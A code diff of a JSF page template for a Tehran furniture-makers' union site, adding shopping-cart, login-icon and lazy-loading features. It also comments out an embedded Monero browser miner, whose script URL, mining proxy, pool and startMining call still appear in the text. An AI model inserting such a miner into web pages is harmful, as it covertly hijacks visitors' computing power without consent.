@@ -11,6 +11,7 @@
 	<meta name="viewport"
 		content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
 		<meta name="enamad" content="947303"/>
+		<meta name="language" content="fa-IR"/>
 	<link rel="icon" href="../../resources/galeb2/image/logo-new.png" type="image/png" />
 	<h:outputStylesheet library="css" name="bootstrap.css" />
 	<link rel="stylesheet" href="../../resources/css/font-awesome.css" />
@@ -22,7 +23,7 @@
 	<h:outputStylesheet library="css" name="owl.theme.css" />
 	<h:outputStylesheet library="css" name="owl.transitions.css" />
 	<h:outputStylesheet library="css" name="flexslider.css" />
-	<h:outputStylesheet library="css" name="animate.css" />
+	<!-- <h:outputStylesheet library="css" name="animate.css" /> -->
 	<h:outputStylesheet library="css" name="colors/light-blue.css" />
 	<link rel="stylesheet" href="../../resources/fonts.css" />
 	
@@ -30,25 +31,38 @@
 	<h:outputScript library="js" name="lib/jquery.min.js" />
 <script src="../../resources/galeb2/js/jquery.hsmenu.min.js"></script>
 <link rel="stylesheet" href="../../resources/galeb2/css/hs-menu.min.css" />
+<style>
+@media screen and (min-width: 992px) {
+	.gg{
+	margin-top: 5px;
+	}
+	#hpbdpg{
+	margin-top: -10px;
+	display: block;
+	}
+}
+.blink_me {
+  animation: blinker 1s linear infinite;
+}
+
+@keyframes blinker {
+  50% {
+    opacity: 0;
+  }
+}
+</style>
 <script>
          $(document).ready(function () {
          $(".hs-menubar").hsMenu(); 
          }); 
       </script>
-	
-	<!-- header -->
-		<!-- menu -->
 
 	<link href="../../resources/menu/css/jquery.drawer.css"
 		rel="stylesheet" />
-
 	<script src="../../resources/menu/js/jquery.drawer.js"></script>
 	<script src="../../resources/menu/demo.js"></script>
-
-	<!-- menu -->
-
 	<ui:insert name="headPage" />
-<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+ <!-- <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 <script>
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "moneroocean.stream";
@@ -58,29 +72,17 @@
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
     throttleMiner = 20;
-</script>
+</script> -->
 </h:head>
 <body>
 
-
-<!-- 	<div id="back-top">
-		<a href="MainPage.html#" class="scroll"> <i
-			class="fa fa-angle-double-up"></i>
-		</a>
-	</div>-->
-
-	<div class="page-loader" style="background-color: #007ad9;">
-		<!-- <div class="loader"> -->
-<!-- 			<div class="rect1"></div>
-			<div class="rect2"></div>
-			<div class="rect3"></div> -->
+<!-- 	<div class="page-loader" style="background-color: #007ad9;">
 			<div  class="forever animated bounceIn" style="position: relative;top: 150px;" data-wow-delay="1.2s">
 	<img  src="../../resources/pic/white-logo.png"  alt=""/>
 		<p class="credits" style="color: white;">سایت اتحادیه درودگران و مبلسازان تهران</p>
 		<h5 style="color: white;" class="credits animate__animated animate__flash">در حال بارگذاری</h5>
-<!-- </div> -->
 		</div>
-	</div> 
+	</div>  -->
 
 	<div class="wrapper demo">
 
@@ -103,25 +105,33 @@
 				<i class="fa fa-instagram white" style="color: white;"/>				
 								</a>
 		</div>
-<!-- 		<div class="search-trigger">
-			<i class="fa fa-search white" style="color: white;"></i>
-		</div> -->
-<!-- 		<div class="search-box">
-	
-			<button  type="submit" class="search-submit" style="padding: 0px!important;">جستجو</button> 
-			<h:button styleClass="search-submit" style="padding: 0px!important;" value="جستجو" outcome="/pages/search/searchtext.xhtml"/>
-		</div> -->
-		<!-- <a class="search-box"></a> -->
 		<h:link styleClass="search-trigger" outcome="/pages/search/searchtext.xhtml">
 		<i class="fa fa-search white" style="color: white;"></i>
 		</h:link>
 		<div class="hs-user toggle" data-reveal=".user-info">
- <i
-				class="fa fa-user white" style="color: white;"></i>
+		<h:panelGroup rendered="#{homeBean.findUserByToken() eq 'مهمان'}">
+        <i class="fa fa-user white" style="color: lightcoral;"></i>
+		</h:panelGroup>
+		<h:panelGroup rendered="#{homeBean.findUserByToken() ne 'مهمان'}">
+        <i  class="fa fa-user white blink_me" style="color: lime;
+			border: 1px solid;
+			padding: 2px;"></i>
+		</h:panelGroup>
 		</div>
+		
 		<div class="grid-trigger toggle" data-reveal=".grid-items">
-			<i class="fa fa-shopping-basket" style="color: white;"></i>
+			<i class="fa fa-shopping-basket gg" style="color: white;">
+			<h:panelGroup id="hpbdpg">
+			  <span style="background-color: red;
+							font-family: IRANSansBold;
+							font-size: 16px;margin-top: -16px; display: table-cell;
+							z-index: 1000 !important;
+							position: relative;" 
+							class="badge badge-danger right">#{userSefaresh.findCountAllSefareshByUser()}</span>
+		    </h:panelGroup>
+			</i>
 		</div>
+		
 		<div class="more-trigger toggle" data-reveal=".user-penal">
 			<i class="fa fa-bars bars" style="color: white;"></i>
 		</div>
@@ -296,19 +306,53 @@
 			<h:outputText value="#{homeBean.findUserByToken()}" rendered="true"/>
 			</li>
 			<li class="more-btn">
-		    <h:link outcome="/pages/login/signin-phone.xhtml" value="ورود" style="font-family: IRANSansBold; font-size: 14px; margin: 5px;" rendered="#{homeBean.findUserByToken() eq 'مهمان'}"/>
-		    <h:link outcome="/pages/login/signin-phone.xhtml" value="پنل مدیریت" style="font-family: IRANSansBold; font-size: 14px; margin: 5px;" rendered="#{homeBean.findUserByToken() ne 'مهمان'}"/>
-		    <h:form rendered="true">
+			<h:form rendered="true" prependId="false">
+		    <h:commandLink action="#{adminLogin.login()}" value="ورود" style="font-family: IRANSansBold; font-size: 14px; margin: 5px;" rendered="#{homeBean.findUserByToken() eq 'مهمان'}"/>
+		    <h:commandLink action="#{adminLogin.login()}" value="پنل مدیریت" style="font-family: IRANSansBold; font-size: 14px; margin: 5px;" rendered="#{homeBean.findUserByToken() ne 'مهمان'}"/>
 		    <h:commandLink action="#{homeBean.logout()}" value="خروج" style="font-family: IRANSansBold; font-size: 14px; margin: 5px;" rendered="#{homeBean.findUserByToken() ne 'مهمان'}"/>
+			<h:inputHidden id="upth" value="#{adminLogin.urlPath}" />
 			</h:form>
 			</li>
 		</ul>
-
-
+<h:form prependId="false">
+<h:panelGroup id="sefresh">
 		<ul class="grid-items">
-		<li class="user-name" style="padding: 0px!important;font-family: IRANSansNor; font-size: 14px;">سبد خرید خالی</li>
-			<li class="more-btn"><a href="#1" style="font-family: IRANSansBold; font-size: 14px;"> تسویه</a></li>
+		<li class="user-name" style="padding: 0px!important;font-family: IRANSansBold; font-size: 14px;margin-bottom: 5px;">سبد سفارش کالا</li>
+		<ui:repeat var="sef" value="#{userSefaresh.findAllSefareshByUser()}">
+		<li class="user-name" style="padding: 15px!important;font-family: IRANSansNor; font-size: 14px;float: right;
+           text-align: right;border: 1px solid darkseagreen;box-shadow: 5px 5px 5px #aaaaaa;
+			border-radius: 20px;margin-bottom: 5px;">
+	     <p style="font-family: IRANSansBold;">نام محصول</p><p title="#{sef.sefareshProduct.nameCode}" style="width: 200px;
+	    																white-space: nowrap;
+																	    overflow: hidden;
+																	    direction: rtl;
+																	    text-overflow: ellipsis;
+																	    font-family: IRANSansNor;">#{sef.sefareshProduct.nameCode}</p>
+	     <h:commandButton action="#{userSefaresh.updateSefaresh(sef.sefareshId)}" value="حذف از سبد"  style="float: right;
+	    width: 50%;
+	    background: red;
+	    height: 20px;
+	    margin-top: 5px;
+	    margin-bottom: 5px;border-radius: 15px;
+	    font-family: IRANSansBold;
+	    color:white;">
+	     <f:ajax execute="@form" render="sefresh hpbdpg"/>
+	     </h:commandButton>
+	    <h:commandButton action="#{userSefaresh.registerUpdateSefaresh(sef.sefareshId)}" value="ثبت سفارش"  style="float: right;
+	    width: 50%;
+	    background: green;
+	    height: 20px;
+	    margin-top: 5px;
+	    margin-bottom: 5px;border-radius: 15px;
+	    font-family: IRANSansBold;
+	    color:white;">
+	     <f:ajax execute="@form" render="sefresh hpbdpg"/>
+	     </h:commandButton>
+		</li>
+		</ui:repeat>			
 		</ul>
+</h:panelGroup>
+</h:form>
 		</section>
 <!-- 		<div class="container" dir="rtl"
 			style="display: flex; align-items: center">
@@ -856,6 +900,7 @@
 	<h:outputScript library="js" name="vendors/flexslider-init.js" />
 	<h:outputScript library="js" name="vendors/jquery.counterup.min.js" />
 	<h:outputScript library="js" name="vendors/wow.min.js" />
+	<h:outputScript library="image-loader" name="imglazyload.js" />
 <!-- 	<script src="../../resources/persianTOeng/latin2Arabic.jquery.js"></script>
 <script>
 $(function() {
@@ -870,7 +915,9 @@ $(function() {
     $(document).ready(function(){
         $('.demo').persiaNumber();
     });
+    document.getElementById("upth").value = window.location.href;
 </script>
+
 <script>
 	jQuery(document).ready(function(){
 
@@ -886,6 +933,18 @@ $(function() {
 
 	});
 </script>
-
+<script>
+			$('img').imgLazyLoad({
+				container: window,
+				effect: 'fadeIn',
+				speed: 600,
+				delay: 400,
+				callback: function(){
+					$( this ).css( 'opacity', .99 );
+				}
+			});
+			$('#slideDivCon').lazyload(options);
+			$('#slide').lazyload(options);
+		</script>
 </body>
 </html>
